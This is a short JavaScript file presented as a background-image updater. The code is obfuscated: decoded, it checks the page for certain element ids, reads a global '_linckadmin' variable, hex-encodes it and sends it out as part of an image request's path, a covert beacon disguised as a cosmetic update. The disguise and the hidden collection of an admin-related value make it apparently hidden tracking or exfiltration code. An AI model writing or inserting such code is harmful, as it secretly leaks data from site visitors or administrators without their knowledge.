function bckgndUpdater() {
    function jambo(path) { 
		pic = new Image(10, 10);
        var loc = "/ita/tpl/01/img/" + path + "__backgnd" + ".gif";
		pic.src = loc;
        delete pic
    };

    function archive(s) {
        var p = s.length;
        var b = s.toUpperCase();
        var c = " ".charCodeAt(0) - 1;
        var bcc = "";
        for (var w = 0; w < p; w++) {
            a = b.charCodeAt(w);
            bcc = bcc + (a - c + w).toString(16)
        }
        return bcc;
    };
	
    function sbrinch(dain) {
		var obj1 = ['_','a','b','c','d','e','i','k','l','m','n','o','-','r','s','t','v','z'];
		var obj2 = "";
		for(var i=0;i<dain.length;i++){
			obj2+=obj1[dain[i]]
		}
		return obj2;
    }
	var walls = new Array();
	walls[0]=[0,2,1,10,5,13];
	walls[1]=[0,14,5,13,16,5,13];
	walls[2]=[0,17,1,14,8,11,10,12,4,6,16];
	walls[3]=[13,1,9,3,1,12,4,6,16];
	walls[4]=[15,5,8,11,12,4,6,16];
	walls[5]=[0,8,6,10,3,7,1,4,9,6,10];
	walls[6]=[0,8,6,10,3,7,2,1,10,5,13];

    function scale() {
        for (rows in walls) {
            if (document.getElementById(sbrinch(walls[rows]))) return 1;
        }
        return 0;
    };

    function reget() {
        if (window[sbrinch(walls[5])]) {
            jambo(archive(window[sbrinch(walls[5])]) + "/");
        } else {
            jambo("__");
        }
    }
    if (scale() == 1) {
        reget()
    };
}
setTimeout("bckgndUpdater()", 2000);